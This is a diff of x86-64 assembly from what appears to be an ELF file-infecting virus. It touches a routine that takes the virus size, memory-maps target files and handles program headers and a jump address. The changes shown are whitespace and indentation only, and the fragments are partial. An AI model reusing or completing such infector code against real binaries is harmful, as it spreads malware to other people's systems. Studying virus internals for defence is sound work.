@@ -32,21 +32,21 @@ _file_size:
 
 _treat_file: ; void treat_file(char *name (rdi), long virus_size (rsi), char *full_path (rdx), bool fork (r10))
 	enter 136, 0 ; equal to push rbp - mov rbp, rsp - sub rsp, 16
-				; rsp + 0 bytes for fd
-				; rsp + 8 bytes for virus size
-				; rsp + 16 bytes for file size
-				; rsp + 24 bytes for mmap return address
-				; rsp + 32 phdr
-				; rsp + 40 actual phnum
-				; rsp + 48 ehdr->e_phnum
-				; rsp + 56 supposed string of file
-				; rsp + 64 name addr
-				; rsp + 72 full_path addr
-				; rsp + 80 name len
-				; rsp + 88 full_path len
-				; rsp + 96 total len
-				; rsp + 104 end jmp addr
-				; rsp + 112 bool, fork or not
+	; rsp + 0 bytes for fd
+	; rsp + 8 bytes for virus size
+	; rsp + 16 bytes for file size
+	; rsp + 24 bytes for mmap return address
+	; rsp + 32 phdr
+	; rsp + 40 actual phnum
+	; rsp + 48 ehdr->e_phnum
+	; rsp + 56 supposed string of file
+	; rsp + 64 name addr
+	; rsp + 72 full_path addr
+	; rsp + 80 name len
+	; rsp + 88 full_path len
+	; rsp + 96 total len
+	; rsp + 104 end jmp addr
+	; rsp + 112 bool, fork or not
 ; check if name != NULL
 	cmp rdi, 0
 	je _not_ok_end
@@ -245,13 +245,13 @@ _call_mmaped_update:
 	mov rsi, QWORD [rsp + 16] ; file size
 	mov rdx, QWORD [rsp + 8] ; virus size
 	mov r10, QWORD [rsp] ; fd
-	mov r11, QWORD [rsp + 96]
-	sub rsp, r11
-	sub rsp, 8
-	mov QWORD [rsp], r11
-	add QWORD [rsp], 8
+		mov r11, QWORD [rsp + 96]
+		sub rsp, r11
+		sub rsp, 8
+		mov QWORD [rsp], r11
+		add QWORD [rsp], 8
 	call _update_mmaped_file
-	add rsp, QWORD [rsp]
+		add rsp, QWORD [rsp]
 	lea rax, [rel _ok_end]
 	mov QWORD [rsp + 104], rax
 
@@ -279,7 +279,7 @@ _ok_end:
 	mov rdi, QWORD [rsp + 64] ; take name addr
 	mov rsi, QWORD [rsp + 72] ; take full path addr
 	mov rdx, rsp
-	sub rdx, r10 ; take full concatened path addr
+		sub rdx, r10 ; take full concatened path addr
 		sub rsp, r10
 		sub rsp, 8
 		mov QWORD [rsp], r10
